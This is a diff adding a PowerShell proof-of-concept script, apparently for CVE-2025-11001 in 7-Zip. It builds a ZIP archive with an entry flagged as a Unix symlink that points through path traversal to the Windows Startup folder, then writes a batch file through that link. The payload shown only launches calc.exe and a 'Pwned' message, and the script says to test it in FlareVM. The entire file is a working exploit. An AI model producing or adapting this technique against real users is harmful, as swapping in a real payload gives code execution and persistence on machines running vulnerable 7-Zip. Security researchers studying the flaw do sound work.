@@ -1,0 +1,56 @@
+# Zwerd SCRIPT
+# Define the output path for the malicious ZIP file
+$zipPath = "$PWD\poc_startup_exploit.zip"
+
+# Clean up previous artifacts if they exist
+if (Test-Path $zipPath) { Remove-Item $zipPath }
+
+# Load necessary .NET assemblies for Zip manipulation
+Add-Type -AssemblyName System.IO.Compression
+Add-Type -AssemblyName System.IO.Compression.FileSystem
+
+# Create the file stream and ZipArchive object
+$fileStream = [System.IO.File]::Create($zipPath)
+$archive = [System.IO.Compression.ZipArchive]::new($fileStream, [System.IO.Compression.ZipArchiveMode]::Create)
+
+# --- Step 1: Create the "Symlink" Entry ---
+# We create an entry that looks like a directory but acts as a pointer
+$linkEntry = $archive.CreateEntry("DropZone")
+
+# KEY EXPLOIT COMPONENT: Set ExternalAttributes to mimic a Unix Symlink.
+# The value 0xA1ED0000 (Unix Symlink + 755 permissions) is too large for a signed Int32.
+# We use the negative representation (Two's Complement) to pass it correctly to .NET.
+$linkEntry.ExternalAttributes = -1578303488 # Equivalent to 0xA1ED0000
+
+# Define the target path (Traversal to the Startup folder)
+# Note: The number of '../' depends on extraction depth. This assumes typical "Downloads" folder depth.
+$targetPath = "../../AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
+
+# Write the target path into the entry (this makes it a symlink)
+$linkStream = $linkEntry.Open()
+$linkWriter = [System.IO.StreamWriter]::new($linkStream)
+$linkWriter.Write($targetPath)
+$linkWriter.Close()
+$linkStream.Close()
+
+# --- Step 2: Place the Payload "Inside" the Symlink ---
+# We create a file entry that appears to be inside the 'DropZone' folder.
+# Since 'DropZone' is a symlink, 7-Zip will follow it and write this file to the target (Startup).
+$malwareEntry = $archive.CreateEntry("DropZone/poc.bat")
+
+# Define the malicious payload content (Simple calc.exe pop)
+$payloadContent = "@echo off`nstart calc.exe`nmsg * 'Pwned by CVE-2025-11001 PoC'"
+
+# Write the payload content
+$malwareStream = $malwareEntry.Open()
+$malwareWriter = [System.IO.StreamWriter]::new($malwareStream)
+$malwareWriter.Write($payloadContent)
+$malwareWriter.Close()
+$malwareStream.Close()
+
+# --- Cleanup & Finish ---
+$archive.Dispose()
+$fileStream.Dispose()
+
+Write-Host "[+] ZIP file created successfully at: $zipPath" -ForegroundColor Green
+Write-Host "[*] Instructions: Transfer to FlareVM and extract with vulnerable 7-Zip." -ForegroundColor Yellow
